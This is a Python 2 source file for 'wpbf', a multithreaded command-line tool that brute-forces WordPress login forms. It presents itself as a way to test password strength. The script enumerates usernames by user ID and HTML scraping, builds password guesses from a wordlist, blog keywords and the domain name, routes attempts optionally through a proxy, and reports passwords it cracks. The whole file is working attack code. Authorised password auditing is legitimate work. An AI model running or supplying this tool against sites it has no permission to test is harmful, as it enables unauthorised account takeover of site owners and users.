#!/usr/bin/env python
#
# wpbf is a WordPress BruteForce script to remotely test password strength of the WordPress blogging software
#
# Copyright 2011 Andres Tarantini (atarantini@gmail.com)
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

import logging, logging.config
import urllib2, urllib, urlparse
import sys, threading, Queue, time, argparse
from string import join

import config, wp

def filter_domain(domain):
    """ Strips TLD and ccTLD (ex: .com, .ar, etc) from a domain name """
    words = [".com", "www.", ".ar", ".cl", ".py", ".org", ".net", ".mx", ".bo", ".gob", ".gov", ".edu"]
    for word in words:
        domain = domain.replace(word, "")
    return domain

class WpbfThread(threading.Thread):
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue

    def run(self):
        while self.queue.qsize() > 0:
	    try:
		word = self.queue.get()
		logger.debug("Trying with "+word)
		if wp.login(config.url, config.username, word, None):
		    logger.info("Password '"+word+"' found for username '"+config.username+"' on "+config.url)
		    self.queue.queue.clear()
		self.queue.task_done()
	    except urllib2.HTTPError, e:
		logger.debug("HTTP Error: "+str(e)+"for: "+word)
		self.queue.put(word)
		logger.debug("Requeued: "+word)

if __name__ == '__main__':
    #parse command line arguments
    parser = argparse.ArgumentParser(description='Bruteforce WordPress login form to test password strenght. Currently supports threads, wordlist and basic username detection.')
    parser.add_argument('url', type=str,  help='base URL where WordPress is installed')
    parser.add_argument('-w', '--wordlist', default=config.wordlist, help="worldlist file (default: "+config.wordlist+")")
    parser.add_argument('-u', '--username', default=config.username, help="username (default: "+config.username+")")
    parser.add_argument('-s', '--scriptpath', default=config.script_path, help="path to the login form (default: "+config.script_path+")")
    parser.add_argument('-t', '--threads', type=int, default=config.threads, help="how many threads the script will spawn (default: "+str(config.threads)+")")
    parser.add_argument('-p', '--proxy', default=None, help="http proxy (ex: http://localhost:8008/)")
    parser.add_argument('-nk', '--nokeywords', action="store_false", help="Search keywords inside the blog's content and add them to the wordlist")
    parser.add_argument('-eu', '--enumerateusers', action="store_true", help="Only enumerate users (withouth bruteforcing)")
    parser.add_argument('-eugt', '--enumeratetolerance', type=int, default=config.eu_gap_tolerance, help="User ID gap tolerance to use in username enumeration (default: "+str(config.eu_gap_tolerance)+")")
    args = parser.parse_args()
    config.wp_base_url = args.url
    if args.wordlist:
        config.wordlist = args.wordlist
    if args.username:
        config.username = args.username
    if args.enumeratetolerance:
        config.eu_gap_tolerance = args.enumeratetolerance
    if args.scriptpath:
        config.script_path = args.scriptpath
    if args.threads:
        config.threads = args.threads
    if args.proxy:
        config.proxy = args.proxy
    else:
        proxy = None

    # logger configuration
    logging.config.fileConfig("logging.conf")
    logger = logging.getLogger("wpbf")

    # build target url
    logger.info("Target URL: "+config.wp_base_url)
    config.url = urllib.basejoin(config.wp_base_url, config.script_path)

    # enumerate usernames
    if args.enumerateusers:
	logger.info("Enumerating users...")
	logger.info("Usernames: "+join(wp.enumerate_usernames(config.wp_base_url, config.eu_gap_tolerance, config.proxy), ", "))
	exit(0)

    # queue
    queue = Queue.Queue()

    # check URL, username and load additional words into queue
    logger.info("Checking URL & username...")
    try:
        if wp.check_username(config.url, config.username, config.proxy) is False:
            logger.warning("Possible non existent username: "+config.username)
            logger.info("Enumerating users...")
	    enumerated_usernames = wp.enumerate_usernames(config.wp_base_url, config.eu_gap_tolerance, config.proxy)
	    if len(enumerated_usernames) > 0:
		logger.info("Usernames: "+join(enumerated_usernames, ", "))
		config.username = enumerated_usernames[0]
	    else:
		logger.info("Trying to find username in HTML content...")
		config.username = wp.find_username(config.wp_base_url, config.proxy)
            if config.username is False:
                logger.error("Can't find username :(")
                sys.exit(0)
            else:
                if wp.check_username(config.url, config.username, config.proxy) is False:
                    logger.error("Username "+config.username+" didn't work :(")
                    sys.exit(0)
                else:
                    logger.info("Using username "+config.username)

	if config.username not in queue.queue:
	    queue.put(config.username)  # load queue with username

	if args.nokeywords:
	    logger.info("Load into queue additional words using keywords from blog...")
	    [queue.put(w) for w in wp.find_keywords_in_url(config.url, config.proxy, config.min_keyword_len, config.min_frequency, config.ignore_with) ]

    except urllib2.URLError:
        logger.error("URL Error on: "+config.url)
        if config.proxy:
            logger.info("Check if proxy is well configured and running")
        sys.exit(0)
    except urllib2.HTTPError:
        logger.error("HTTP Error on: "+url)
        sys.exit(0)

    # load wordlist into queue
    logger.debug("Loading wordlist...")
    [queue.put(w.strip()) for w in open(config.wordlist, "r").readlines()]
    logger.debug(str(queue.qsize())+" words loaded from "+config.wordlist)
    queue.put(filter_domain(urlparse.urlparse(config.url).hostname))     # load queue with additional words using domain name

    # spawn threads
    logger.info("Bruteforcing...")
    for i in range(config.threads):
        t = WpbfThread(queue)
        t.start()

    # feedback to stdout
    while queue.qsize() > 0:
	try:
	    # poor ETA implementation
	    start_time = time.time()
	    start_queue = queue.qsize()
	    time.sleep(10)
	    delta_time = time.time() - start_time
	    current_queue = queue.qsize()
	    delta_queue = start_queue - current_queue
	    wps = delta_time / delta_queue
	    print str(current_queue)+" words left / "+str(round(1 / wps, 2))+" passwords per second / "+str( round((wps*current_queue / 60)/60,2) )+"h left"
        except KeyboardInterrupt:
	    logger.info("Clearing queue and killing threads...")
	    queue.queue.clear()
            for t in threading.enumerate()[1:]:
                t.join()
